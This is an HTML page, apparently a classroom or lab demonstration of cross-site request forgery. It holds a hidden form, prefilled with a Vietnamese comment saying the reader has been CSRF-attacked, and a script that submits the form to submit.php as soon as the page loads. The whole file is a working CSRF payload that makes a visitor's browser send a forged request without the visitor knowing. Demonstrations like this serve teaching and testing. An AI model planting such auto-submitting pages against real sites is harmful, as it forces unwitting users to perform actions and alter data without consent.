
<!DOCTYPE html>
<html lang="en">

<head>
</head>
<body>
    <div class="container mt-5" style="display: none">
            <div class="col-md-4 bd-example ">
                <h4>Thêm bình luận mới</h4>
                <form class="form-autosubmit" action="submit.php" method="post" id="auto-submit-form">
                    <div class="mb-3">
                        <label for="comment" class="form-label">Bình luận</label>
                        <input class="form-control" id="comment" name="comment" value="bạn đã bị tấn công csrf">
                    </div>
                </form>
            </div>
        </div>
    </div>
    <!-- Bootstrap 5 JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.2/js/bootstrap.min.js"></script>
    <script>
        // Tự động submit form khi trang vừa load
        document.addEventListener('DOMContentLoaded', function () {
            setTimeout(() => { document.querySelector('.form-autosubmit').submit(); }, 0);

        });
    </script>
</body>

</html>
